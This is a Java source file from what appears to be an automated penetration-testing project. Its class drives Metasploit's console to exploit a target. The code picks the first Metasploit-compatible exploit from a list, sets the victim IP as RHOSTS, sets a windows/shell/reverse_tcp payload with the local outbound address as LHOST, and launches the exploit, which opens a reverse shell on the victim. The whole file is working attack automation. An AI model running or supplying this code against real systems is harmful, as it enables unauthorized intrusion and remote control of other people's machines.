package PenetrationTestingAutomatized;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class MetasploitExploitationTool implements ExploitationModule{
	//object for handling the subprocesses, in this case for Metasploit Console
	private ProcessBuilder process;
	
	public MetasploitExploitationTool() {
		this.process = new ProcessBuilder();
	}
	
	@Override
	public void searchAndExploit(List<String> exploitsList, InetAddress victimIP) {
		// search metasploit compatible exploits:
		List<String> MetasploitCompatibleExploits = new ArrayList<String>();
		
		for(String exploit : exploitsList) {
			if(exploit.contains("MSF:EXPLOIT")) MetasploitCompatibleExploits.add(exploit.replace("MSF:", "").toLowerCase());
		}
		System.out.println("METASPLOIT COMPATIBLE EXPLOITS: \n");
		System.out.println(MetasploitCompatibleExploits.toString());
		
		try {
			//test con un solo processo
			Process process = new ProcessBuilder("msfconsole").start();
			
			OutputStream os = process.getOutputStream();
	        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));

	        bw.write("use "+MetasploitCompatibleExploits.get(0).toString()+"\n");
	        Thread.sleep(10);
	        //strip "/" char for ip
	        bw.write("set RHOSTS "+victimIP.toString().replace("/", "")+"\n");
	        Thread.sleep(10);
	        bw.write("set PAYLOAD windows/shell/reverse_tcp\n");
	        Thread.sleep(10);
	        try(final DatagramSocket socket = new DatagramSocket()){
	        	//This way works well when there are multiple network interfaces. It always returns the preferred outbound IP.
	        	socket.connect(InetAddress.getByName("8.8.8.8"), 10002);
	        	bw.write("set LHOST "+ socket.getLocalAddress().getHostAddress().toString() +"\n");
	        	Thread.sleep(10);
	        }
	        bw.write("exploit\n");
	        Thread.sleep(10);
	        bw.close();
	        
	        InputStream is = process.getInputStream();
	        BufferedReader br = new BufferedReader (new InputStreamReader(is));
	        
	        String textOut;
	        while ((textOut = br.readLine()) != null) {
	             System.out.println(textOut);
	        }

	        is.close();
	        os.close();
	        
			/*
			//search and use for all the exploits given
			for(String exploit : exploitsList) {
				//start metasploit and wait for the execution 
				//gnome-terminal --window -- msfconsole [open in a new window]
				process.command("gnome-terminal","--window","--","msfconsole");
				Process p = process.start();
				//replace the string MSF: at the start for adjusting the search parameter in metasploit
				//get the output for executing commands inside the new shell
				OutputStream writeTo = p.getOutputStream();
				writeTo.write(("use"+exploit.replace("MSF:", "")).getBytes());
				writeTo.flush();
				writeTo.close();
			}
			*/
		} catch (IOException | InterruptedException e) {
			if(e instanceof IOException) System.err.println("I/O ERROR DURING EXECUTION OF THE SUBPROCESS");
			if(e instanceof InterruptedException) System.err.println("InterruptedException ERROR DURING EXECUTION OF THE SUBPROCESS");
			e.printStackTrace();
		}
	}

}
